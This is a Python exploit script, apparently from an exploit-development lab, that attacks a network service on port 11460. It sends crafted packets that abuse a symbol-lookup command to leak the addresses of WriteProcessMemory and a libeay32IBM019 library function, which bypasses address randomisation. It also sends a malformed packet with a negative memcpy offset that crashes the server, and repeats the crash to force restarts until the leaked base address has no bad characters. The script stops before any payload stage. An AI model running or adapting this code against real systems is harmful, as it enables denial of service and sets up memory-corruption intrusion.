#!/usr/bin/env python3

import socket
import sys
import time
from struct import pack


def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        return 0
    return address


def leak_function_address(function_name: bytearray, server: str, port: int) -> int:
    """ Leaks a function address from the server. """
    psAgentCommand = bytearray([0x41] * 0xC)
    psAgentCommand += pack("<i", 0x2000)  # opcode
    psAgentCommand += pack("<i", 0x0)  # 1st memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 1st memcpy: size field
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: size field
    psAgentCommand += pack("<i", 0x200)  # 3rd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 3rd memcpy: size field
    psAgentCommand += bytearray([0x41] * 0x8)

    symbol = b"SymbolOperation" + function_name + b"\x00"
    psCommandBuffer = symbol + b"A" * (100 - len(symbol))
    psCommandBuffer += b"B" * 0x100
    psCommandBuffer += b"C" * 0x100

    # checksum and command.
    buf = pack(">i", len(psAgentCommand) + len(psCommandBuffer) - 4) + psAgentCommand + psCommandBuffer

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        response = s.recv(1024)
        s.close()
    except:
        return 0

    return parseResponse(response)


def crash_server(server: str, port: int):
    payload_size = 0x64  # Total size of payload not including checksum.
    agent_command_size = 0x30  # Size of the agent command portion.
    command_buffer_size = payload_size - agent_command_size  # Size of the command buffer.

    agent_command_buffer = b"A" * 0x10
    agent_command_buffer += b"\x44\x61\x36\xf8"  # offset first copy. Large negative value.
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of first copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset for second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset of third copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of third copy
    agent_command_buffer += b"A" * (agent_command_size - len(agent_command_buffer))

    buf = pack(">i", payload_size)
    buf += agent_command_buffer
    buf += bytearray([0x42] * command_buffer_size)

    continue_send_data = True
    while continue_send_data:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buf)
            s.close()
            continue_send_data = False
        except:
            pass



def main():
    bad_chars = b"\x00\x09\x0a\x0c\x0d\x20"
    server = "192.168.185.10"
    port = 11460
    bad_chars_remain = True
    write_process_memory_addr = 0
    get_new_lockid_addr = 0
    libeay32IBM019Base = 0

    while bad_chars_remain:
        while write_process_memory_addr == 0 or get_new_lockid_addr == 0 or libeay32IBM019Base == 0:
            write_process_memory_addr = leak_function_address(b"WriteProcessMemory", server, port)
            get_new_lockid_addr = leak_function_address(b"N98E_CRYPTO_get_new_lockid", server, port)
            libeay32IBM019Base = get_new_lockid_addr - 0x14E0


        print("WriteProcessMemory Address: " + hex(write_process_memory_addr))
        print("N98E_CRYPTO_get_new_lockid Address: " + hex(get_new_lockid_addr))
        print("Libeay32IBM019 Base Address: " + hex(libeay32IBM019Base))

        base_address_bytes = pack(">i", libeay32IBM019Base)
        bad_chars_remain = False

        for bad_char in bad_chars:
            if base_address_bytes[0] == bad_char or base_address_bytes[1] == bad_char:
                print("Bad character detected. Restarting server...")
                print("Note: It might take a while for the server to restart.")
                bad_chars_remain = True
                crash_server(server, port)
                write_process_memory_addr = 0
                get_new_lockid_addr = 0
                libeay32IBM019Base = 0
                break;

    print("No bad characters detected! Continuing with exploit!")

    sys.exit(0)


if __name__ == "__main__":
    main()
